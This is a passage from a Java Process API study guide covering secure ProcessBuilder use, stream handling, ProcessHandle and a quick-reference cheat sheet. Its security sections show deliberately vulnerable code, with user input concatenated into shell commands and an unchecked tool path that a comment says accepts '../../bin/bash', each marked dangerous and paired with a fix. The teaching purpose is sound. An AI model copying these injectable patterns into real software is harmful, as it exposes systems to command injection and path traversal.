If your use case genuinely requires shell features, **whitelist** the input before using it:

```java
// If you must use a shell, validate input strictly
private static final Pattern SAFE_FILENAME = Pattern.compile("[a-zA-Z0-9._\\-]{1,255}");

public void searchFiles(String userFilename) throws Exception {
    // VALIDATE first — reject anything not matching safe pattern
    if (!SAFE_FILENAME.matcher(userFilename).matches()) {
        throw new IllegalArgumentException("Invalid filename: " + userFilename);
    }

    // Now it's safe to use in a shell command (though the list-based approach is still preferred)
    ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c",
        "find /uploads -name " + userFilename + " -type f");
    Process p = pb.start();
}
```

### 10.6 The Core Rule

> **Never concatenate user input into a shell command string.**
> Always pass user data as a **separate argument** in the `ProcessBuilder` list.
> If you must use `/bin/sh -c`, **whitelist-validate** the input first.

```java
// ❌ DANGEROUS — never do this
new ProcessBuilder("/bin/sh", "-c", "convert " + userInput + " output.jpg");

// ✅ SAFE — each argument is isolated
new ProcessBuilder("convert", userInput, "output.jpg");
// userInput is just a filename argument — no shell interpretation
```

### 10.7 Additional Security Hardening

```java
public ProcessBuilder hardened(String... command) {
    ProcessBuilder pb = new ProcessBuilder(command);

    // 1. Run in a restricted working directory — not /
    pb.directory(new File("/tmp/sandbox"));

    // 2. Sanitize the environment — don't inherit potentially dangerous env vars
    Map<String, String> env = pb.environment();
    env.clear();
    env.put("PATH", "/usr/bin:/bin");     // minimal PATH
    env.put("HOME", "/tmp/sandbox");      // restricted home
    // Do NOT pass DATABASE_PASSWORD, AWS_SECRET_KEY, etc.

    // 3. Merge stderr so you can log it
    pb.redirectErrorStream(true);

    return pb;
}
```

### 10.8 Path Injection — Validate Executable Paths

```java
// DANGEROUS — user could supply "../../bin/bash" as tool name
public void runTool(String toolName) throws Exception {
    new ProcessBuilder("/opt/tools/" + toolName).start(); // path traversal!
}

// SAFE — whitelist allowed tools
private static final Set<String> ALLOWED_TOOLS = Set.of("tool-a", "tool-b", "analyzer");

public void runTool(String toolName) throws Exception {
    if (!ALLOWED_TOOLS.contains(toolName)) {
        throw new SecurityException("Tool not permitted: " + toolName);
    }
    new ProcessBuilder("/opt/tools/" + toolName).start(); // now safe
}
```

### 10.9 Security Summary

| Risk | Mitigation |
|---|---|
| Command injection via shell | Use list-based args, no `/bin/sh -c` with user input |
| Argument injection | Pass user data as separate list elements |
| Path traversal | Validate executable paths; use whitelists |
| Environment leakage | Clear `env` map, set minimal safe values |
| Privilege escalation | Run child in restricted directory, drop privileges |
| Unbounded execution | Use `waitFor(timeout, unit)` |
| Resource exhaustion | Limit concurrent child processes |

---

## 11. Additional Topics

### 11.1 Cross-Platform Command Differences

A common source of bugs is writing process commands that only work on one OS:

```java
public class CrossPlatform {

    public static ProcessBuilder listDirectory(String path) {
        String os = System.getProperty("os.name").toLowerCase();

        if (os.contains("win")) {
            return new ProcessBuilder("cmd.exe", "/c", "dir", path);
        } else {
            return new ProcessBuilder("ls", "-la", path);
        }
    }

    public static ProcessBuilder runScript(String scriptPath) {
        String os = System.getProperty("os.name").toLowerCase();

        if (os.contains("win")) {
            return new ProcessBuilder("cmd.exe", "/c", scriptPath);
        } else {
            return new ProcessBuilder("/bin/sh", scriptPath);
        }
    }
}
```

### 11.2 Detecting the OS

```java
String os = System.getProperty("os.name").toLowerCase();
boolean isWindows = os.contains("win");
boolean isMac     = os.contains("mac");
boolean isLinux   = os.contains("nux") || os.contains("nix");
```

### 11.3 Inheriting Environment Selectively

```java
// Start with JVM's environment, then selectively override
ProcessBuilder pb = new ProcessBuilder("myapp");
Map<String, String> env = pb.environment(); // starts as copy of current env

// Override specific variables
env.put("LOG_LEVEL", "DEBUG");
env.remove("DISPLAY"); // remove headless env vars

// Now the child has all of Java's env plus your overrides
```

### 11.4 Reading Large Output — `transferTo()`

For large process outputs, avoid `readAllBytes()` (loads everything into memory):

```java
ProcessBuilder pb = new ProcessBuilder("cat", "huge-file.log");
pb.redirectErrorStream(true);
Process p = pb.start();

// Stream output to a file without loading into memory
try (InputStream in = p.getInputStream();
     OutputStream out = new FileOutputStream("copy.log")) {
    in.transferTo(out); // Java 9+ — efficiently streams without large buffer
}

p.waitFor();
```

### 11.5 Checking if a Command Exists

```java
public static boolean commandExists(String command) {
    try {
        ProcessBuilder pb = System.getProperty("os.name").toLowerCase().contains("win")
            ? new ProcessBuilder("where", command)
            : new ProcessBuilder("which", command);
        pb.redirectErrorStream(true);
        Process p = pb.start();
        p.getInputStream().transferTo(OutputStream.nullOutputStream()); // drain
        return p.waitFor() == 0;
    } catch (Exception e) {
        return false;
    }
}

// Usage
System.out.println(commandExists("git"));    // true/false
System.out.println(commandExists("docker")); // true/false
```

### 11.6 Reusing `ProcessBuilder` — `start()` is Reusable

You can call `start()` multiple times on the same `ProcessBuilder`:

```java
ProcessBuilder pb = new ProcessBuilder("date");
pb.redirectErrorStream(true);

// Start multiple instances
for (int i = 0; i < 3; i++) {
    Process p = pb.start();
    System.out.println(new String(p.getInputStream().readAllBytes()).trim());
    p.waitFor();
    Thread.sleep(1000);
}
```

### 11.7 Process Groups and Children on Unix

On Unix systems, child processes may themselves spawn further children. When you call `destroy()` on the parent, the grandchildren may **not** be killed. To kill an entire process tree:

```java
// Java 9+ — kill a process and all its descendants
Process p = pb.start();

// Kill entire tree
p.toHandle().descendants().forEach(ProcessHandle::destroyForcibly);
p.destroyForcibly();
```

### 11.8 `CompletableFuture` Composition with Processes

```java
// Run two processes in parallel, combine results
CompletableFuture<String> future1 = CompletableFuture.supplyAsync(() -> {
    try {
        Process p = new ProcessBuilder("hostname").start();
        String out = new String(p.getInputStream().readAllBytes()).trim();
        p.waitFor();
        return out;
    } catch (Exception e) { throw new RuntimeException(e); }
});

CompletableFuture<String> future2 = CompletableFuture.supplyAsync(() -> {
    try {
        Process p = new ProcessBuilder("whoami").start();
        String out = new String(p.getInputStream().readAllBytes()).trim();
        p.waitFor();
        return out;
    } catch (Exception e) { throw new RuntimeException(e); }
});

future1.thenCombine(future2, (host, user) ->
    String.format("Running as %s on %s", user, host))
    .thenAccept(System.out::println)
    .join();
```

### 11.9 `Runtime.exec()` — Legacy API (Avoid)

For historical awareness — the old way:

```java
// OLD — Runtime.exec() — avoid this
Process p = Runtime.getRuntime().exec("ls -la /tmp");

// PROBLEMS:
// 1. Splits by spaces — breaks on filenames with spaces
// 2. No stream handling convenience
// 3. No working directory / environment configuration
// 4. Deprecated mental model

// Use ProcessBuilder instead — always
```

### 11.10 Complete Utility Class

```java
import java.io.*;
import java.lang.*;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.*;

public final class Processes {

    private Processes() {}

    public record Result(int exitCode, String stdout, String stderr) {
        public boolean success() { return exitCode == 0; }
    }

    /** Run a command and collect stdout/stderr. Throws on timeout. */
    public static Result run(long timeoutSec, String... command)
            throws IOException, InterruptedException, TimeoutException {

        ProcessBuilder pb = new ProcessBuilder(command);
        Process p = pb.start();

        StringBuilder out = new StringBuilder();
        StringBuilder err = new StringBuilder();

        Thread outThread = readAsync(p.getInputStream(), out);
        Thread errThread = readAsync(p.getErrorStream(), err);

        boolean done = p.waitFor(timeoutSec, TimeUnit.SECONDS);
        outThread.join(TimeUnit.SECONDS.toMillis(timeoutSec));
        errThread.join(TimeUnit.SECONDS.toMillis(timeoutSec));

        if (!done) {
            p.destroyForcibly();
            throw new TimeoutException("Process timed out: " + Arrays.toString(command));
        }

        return new Result(p.exitValue(), out.toString(), err.toString());
    }

    private static Thread readAsync(InputStream is, StringBuilder sb) {
        Thread t = new Thread(() -> {
            try (BufferedReader br = new BufferedReader(
                    new InputStreamReader(is, StandardCharsets.UTF_8))) {
                br.lines().forEach(line -> sb.append(line).append('\n'));
            } catch (IOException ignored) {}
        });
        t.setDaemon(true);
        t.start();
        return t;
    }

    public static void main(String[] args) throws Exception {
        Result r = run(10, "git", "log", "--oneline", "-5");
        if (r.success()) {
            System.out.println("Recent commits:\n" + r.stdout());
        } else {
            System.err.println("Error:\n" + r.stderr());
        }
    }
}
```

---

## 12. Quick Reference Cheat Sheet

### ProcessBuilder Setup

```java
ProcessBuilder pb = new ProcessBuilder("cmd", "arg1", "arg2");
pb.command(List.of("cmd", "arg1"));         // replace command
pb.directory(new File("/path"));            // working directory
pb.environment().put("KEY", "value");       // set env var
pb.environment().remove("KEY");             // remove env var
pb.environment().clear();                   // clean env
pb.redirectErrorStream(true);               // merge stderr → stdout
pb.inheritIO();                             // inherit all three streams
pb.redirectOutput(Redirect.to(file));       // stdout → file
pb.redirectOutput(Redirect.appendTo(file)); // stdout → append file
pb.redirectInput(Redirect.from(file));      // stdin ← file
pb.redirectError(Redirect.DISCARD);         // discard stderr
Process p = pb.start();                     // LAUNCH IT
```

### Process Control

```java
p.pid()                                     // OS process ID (Java 9+)
p.isAlive()                                 // non-blocking alive check
p.exitValue()                               // non-blocking exit code (throws if running)
p.waitFor()                                 // block until exit — returns exit code
p.waitFor(5, TimeUnit.SECONDS)              // block with timeout — returns boolean
p.destroy()                                 // send SIGTERM (graceful)
p.destroyForcibly()                         // send SIGKILL (immediate)
p.onExit()                                  // CompletableFuture<Process> (Java 9+)
```

### Process I/O

```java
p.getInputStream()    // read process STDOUT (confusingly named "input" to Java)
p.getErrorStream()    // read process STDERR
p.getOutputStream()   // write to process STDIN
```

### ProcessHandle (Java 9+)

```java
ProcessHandle.current()               // JVM's own process
ProcessHandle.of(pid)                 // Optional<ProcessHandle> by PID
ProcessHandle.allProcesses()          // Stream<ProcessHandle> all visible processes
p.toHandle()                          // Process → ProcessHandle
handle.pid()                          // OS PID
handle.isAlive()                      // alive check
handle.info()                         // ProcessHandle.Info snapshot
handle.parent()                       // Optional<ProcessHandle>
handle.children()                     // Stream<ProcessHandle> direct children
handle.descendants()                  // Stream<ProcessHandle> all descendants
handle.destroy()                      // request termination
handle.destroyForcibly()              // force terminate
handle.onExit()                       // CompletableFuture<ProcessHandle>
```

### ProcessHandle.Info (all Optional)

```java
info.command()           // Optional<String>   — executable path
info.arguments()         // Optional<String[]> — command-line args
info.commandLine()       // Optional<String>   — full command line
info.user()              // Optional<String>   — OS username
info.startInstant()      // Optional<Instant>  — when process started
info.totalCpuDuration()  // Optional<Duration> — total CPU time used
```

### Pipeline (Java 9+)

```java
List<Process> procs = ProcessBuilder.startPipeline(List.of(pb1, pb2, pb3));
// procs.get(0) = first process
// procs.get(procs.size()-1) = last process — read its stdout for final output
// wait for all: procs.forEach(p -> p.waitFor());
```

### Security Rules

```java
// ❌ NEVER
new ProcessBuilder("/bin/sh", "-c", "cmd " + userInput);

// ✅ ALWAYS
new ProcessBuilder("cmd", userInput); // separate argument — no shell interpretation

// ✅ IF SHELL IS UNAVOIDABLE — whitelist first
if (!userInput.matches("[a-zA-Z0-9._\\-]{1,100}")) throw new SecurityException();
```

### Key Pitfalls to Remember

| Pitfall | Fix |
|---|---|
| Process hangs — pipe buffer full | Always read both stdout and stderr concurrently |
| `IllegalThreadStateException` on `exitValue()` | Call `waitFor()` first, or check `isAlive()` |
| Shell metacharacters ignored | Use `/bin/sh -c` only when you need shell features |
| Command injection | Never embed user input in shell command strings |
| Child process not killed | Use `destroyForcibly()` after `destroy()` timeout |
| Grandchildren not killed | Use `handle.descendants().forEach(::destroyForcibly)` |
| `getInputStream()` vs `getOutputStream()` confusion | `getInputStream()` = read process's stdout; `getOutputStream()` = write to process's stdin |
| No timeout on `waitFor()` | Always use `waitFor(timeout, unit)` in production |

---

*End of Java Process API Study Guide — Module 13*
